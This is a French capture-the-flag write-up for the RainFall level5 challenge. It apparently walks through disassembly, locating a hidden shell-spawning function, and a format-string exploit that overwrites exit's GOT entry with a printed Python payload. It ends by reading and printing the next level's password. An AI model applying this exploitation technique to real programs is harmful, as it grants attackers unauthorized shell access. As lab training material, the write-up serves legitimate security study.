Meme genre de binaire que le level3

r2 level5

[0x080483f0]> pdf @main
            ; DATA XREF from entry0 @ 0x8048407
┌ 13: int main (int argc, char **argv, char **envp);
│           0x08048504      55             push ebp
│           0x08048505      89e5           mov ebp, esp
│           0x08048507      83e4f0         and esp, 0xfffffff0
│           0x0804850a      e8b3ffffff     call sym.n
│           0x0804850f      c9             leave
└           0x08048510      c3             ret
[0x080483f0]> pdf @sym.n
            ; CALL XREF from main @ 0x804850a
┌ 66: sym.n ();
│           ; var char *format @ ebp-0x208
│           ; var int32_t size @ esp+0x4
│           ; var FILE *stream @ esp+0x8
│           0x080484c2      55             push ebp
│           0x080484c3      89e5           mov ebp, esp
│           0x080484c5      81ec18020000   sub esp, 0x218
│           0x080484cb      a148980408     mov eax, dword [obj.stdin]  ; loc.__bss_start
│                                                                      ; [0x8049848:4]=0
│           0x080484d0      89442408       mov dword [stream], eax     ; FILE *stream
│           0x080484d4      c74424040002.  mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size
│           0x080484dc      8d85f8fdffff   lea eax, [format]
│           0x080484e2      890424         mov dword [esp], eax        ; char *s
│           0x080484e5      e8b6feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080484ea      8d85f8fdffff   lea eax, [format]
│           0x080484f0      890424         mov dword [esp], eax        ; const char *format
│           0x080484f3      e888feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080484f8      c70424010000.  mov dword [esp], 1          ; int status
└           0x080484ff      e8ccfeffff     call sym.imp.exit           ; void exit(int status)

La rien de particulier. Rien nous indiques un probleme.  Donc on essaye de voir avec gdb si il y a une fonction cache

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx

Effectivement il y la fonction o. Mais elle n'est jamais appeller

r2 level5

[0x080483f0]> pdf @sym.o
┌ 30: sym.o ();
│           0x080484a4      55             push ebp
│           0x080484a5      89e5           mov ebp, esp
│           0x080484a7      83ec18         sub esp, 0x18
│           0x080484aa      c70424f08504.  mov dword [esp], str._bin_sh ; [0x80485f0:4]=0x6e69622f ; "/bin/sh" ; const char *string
│           0x080484b1      e8fafeffff     call sym.imp.system         ; int system(const char *string)
│           0x080484b6      c70424010000.  mov dword [esp], 1          ; int status
└           0x080484bd      e8cefeffff     call sym.imp._exit          ; void _exit(int status)

On constate un call de system qui prend "/bin/sh" cependant comme cette fonction est jamais appeller il est difficile d'arriver dans cette sections du binaire

Cependant en si on fake le call de exit en lui indicant une redirection vers la fonction o au lieu de quiter le programme on pourra rentrer dans la fonction o

pour ce faire il nous faut l'addresse de la sortie de exit. et l'addresse de o

pour l'adresse de o on la deja grace a info functions via gdb 0x080484a4. et pour exit faut utiliser objdump parce que si on recupere l'addresse comme celle de o on aura l'addresse de la fonction exit et non pas l'adresse du GOTO (la redirection)

level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit

on garde la deuxieme 08049838

maintenant on va essayer de segfault le binaire, intuitivement on fait comme les levels precedent

level5@RainFall:~$ ./level5
%n
Segmentation fault (core dumped)

Maintenant on commence notre petite modif on va essayer de recup la position de l'adresse qui segfault

level5@RainFall:~$ cat /tmp/run - | ./level5
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078

Donc on 4 bytes de diff.

Maintenant on va faire notre injection on va convertir en little endian l'addresse du GOTO de exit et convertir celle de o en decimal
\x38\x98\x04\x08 pour GOTO de exit puis en decimal pour o 134513828

on va sub 4 a 134513824 car notre addresse est de 4 bytes. Ce qui nous donne

python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/run

on test

cat /tmp/run - | ./level5

La si c'est long c'est normal car on parcourt enormement de bytes d'une valeur egal a la decimal passer en param

En principe on a un 512 qui va etre afficher a un moment puis le programme va cesser de mouliner

Donc la je test un whoami

              512
whoami
level6

Ca fonctionne, du coup

level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

